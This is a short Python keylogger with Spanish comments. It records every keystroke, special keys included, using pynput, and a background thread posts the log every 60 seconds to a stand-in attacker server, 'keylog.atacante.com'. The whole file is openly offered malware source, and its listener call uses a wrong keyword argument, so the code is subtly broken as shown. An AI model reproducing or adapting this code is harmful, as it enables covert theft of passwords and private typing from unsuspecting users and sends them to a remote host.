from pynput.keyboard import Listener #Para capturar las pulsaciones del teclado
import requests 

import threading

log = "" #Variable que guarda las teclas presionadas
server_url = "https://keylog.atacante.com"

def press_tecla(key):
    global log
    try:
        log += key.char # Capturamos caracteres normales (letras, números, símbolos)
    except AttributeError:
        log += f"[{key}]" # Capturamos teclas especiales (Shift, Enter, Ctrl, etc.)

def send_log():
    global log
    if log:
        try:
            response = requests.post(server_url, data={'log': log}) #Enviamos teclas capturadas al servidor
            if response.status_code == 200:
                print("Log enviado con éxito")
                log = ""
        except Exception as e:
            print(f"Error al enviar el log: {e}")

def start_sending(): #Para enviar teclas cada cierto tiempo
    while True:
        send_log()
        threading.Event().wait(60)

# Iniciamos el envío en un hilo separado
threading.Thread(target=start_sending, daemon=True).start()

# Capturamos las teclas en otro hilo
with Listener(press_tecla=press_tecla) as listener:
    listener.join() # Mantiene el keylogger activo
